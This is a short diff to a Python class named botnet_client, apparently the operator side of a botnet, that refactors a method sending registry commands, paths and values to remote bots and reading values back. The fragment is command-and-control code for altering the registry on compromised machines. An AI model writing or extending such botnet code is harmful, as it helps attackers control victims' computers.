@@ -189,11 +189,11 @@ class botnet_client:
     # send refistry command to server
     def send_reg_cmd(self, cmd, path, val_name, val, val_type):
         self.__send_msg("REGCMD")
-        self.nw.write(cmd + '\n'); self.nw.flush()
-        self.nw.write(path + '\n'); self.nw.flush()
-        self.nw.write(val_name + '\n'); self.nw.flush()
-        self.nw.write(val + '\n'); self.nw.flush()
-        self.nw.write(val_type + '\n'); self.nw.flush()
+        self.__send_msg(cmd)
+        self.__send_msg(path)
+        self.__send_msg(val_name)
+        self.__send_msg(val)
+        self.__send_msg(val_type)
         
         if (cmd == "GETVAL"):
             val = self.__recv().decode('utf-8')
